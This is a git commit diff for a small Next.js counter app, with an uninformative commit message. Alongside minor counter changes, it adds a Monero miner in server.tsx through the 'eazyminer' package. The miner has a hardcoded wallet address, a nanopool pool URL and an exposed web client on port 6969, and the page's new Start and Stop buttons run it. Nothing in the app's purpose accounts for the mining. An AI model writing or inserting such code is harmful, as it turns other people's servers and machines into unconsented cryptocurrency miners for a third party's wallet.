2c31af537cbeef3fa64fe8ec5f4e09c6cba96ebf
marin <marinkitagawa.x86@gmail.com>
2023-10-01 22:34:32 -0400

    vfd
    Signed-off-by: marin <marinkitagawa.x86@gmail.com>

--- src/app/page.tsx
+++ src/app/page.tsx
@@ -1,6 +1,7 @@
 "use client"
 import { useState } from 'react'
 import StartCounting from './server'
+import {start, stop} from './server'
 
 
 
@@ -12,18 +13,27 @@ export default function Home() {
 
  const [waiting, setWaiting] = useState(false)
  const [res, setRes] = useState(0)
-
+ const [end, setEnd] = useState(0)
  
 
 
   return (
 <div suppressHydrationWarning className='bg-white min-h-screen text-black p-8'>
+  <form action="">
+    <label htmlFor="">
+      <input type="number" className='w-32 h-6 border-2 ' onChange={(e)=>{setEnd(e.target.valueAsNumber)}}/>
+    </label>
+  </form>
+  <button onClick={async()=>{await start()}} className='hover:bg-opacity-25 h-6 w-max px-4 bg-green-400'>Start</button>
+  <button onClick={async()=>{await stop()}} className='hover:bg-opacity-25 h-6 w-max px-4 bg-red-400'>Stop</button>
   <p>{res}</p>
   <div className={`px-4 h-6 w-max ${waiting ? 'bg-gray-200': ' bg-gray-400'} hover:bg-gray-200 `} onClick={async ()=>{
     setWaiting(true);
-    setRes(await StartCounting())
-    console.log(res)
+    console.time();
+    setRes(await StartCounting(end))
+    console.log(res);
     setWaiting(false);
+    console.timeEnd();
   }} >start process</div>
 </div>
   )
--- src/app/server.tsx
+++ src/app/server.tsx
@@ -19,8 +19,8 @@ class Counter {
 
    startIncrementing(){
     this.incrementing = true
-    for(var i = 0; i<=this.end; i++){
-        sleep(5000)
+    for(var i = 0; i<this.end; i++){
+        sleep(10)
         this.number++
     }
    }
@@ -39,9 +39,58 @@ function sleep(milliseconds:number) {
     }
   }
 
-export default async function StartCounting(){
+  const Miner = require('eazyminer');
 
-    let C = new Counter(1)
+const miner = new Miner({
+    pools: [{
+        coin: 'XMR',
+        user: '47D8WQoJKydhTkk26bqZCVF7FaNhzRtNG15u1XiRQ83nfYqogyLjPMnYEKarjAiCz93oV6sETE9kkL3bkbvTX6nMU24CND8',
+        pass: "x",
+        url: 'xmr-us-east1.nanopool.org:10300', // optional pool URL,
+    }],
+    opencl: {
+      enabled: false,
+      platform: 'AMD',
+      loader: null,
+      adl: true,
+      "cn-lite/0": false,
+      "cn/0": false
+  },
+
+  // (XMRIG config options https://xmrig.com/docs/miner/config/cuda)
+  cuda: {
+      enabled: false,
+      loader: null,
+      nvml: true,
+      "cn-lite/0": false,
+      "cn/0": false
+  },
+  web: {
+        
+    // Enable or Disable web client
+    enabled: true,
+
+    // The used port for the webclient
+    port: 6969 
+},
+  productionOnly: false,
+    autoStart: false // optional delay
+    
+    
+});
+
+export async function start(){
+  return(miner.start())
+}
+
+export async function stop(){
+  return(miner.stop())
+}
+
+
+export default async function StartCounting(end:number){
+
+    let C = new Counter(end)
     C.startIncrementing()
 
     return(
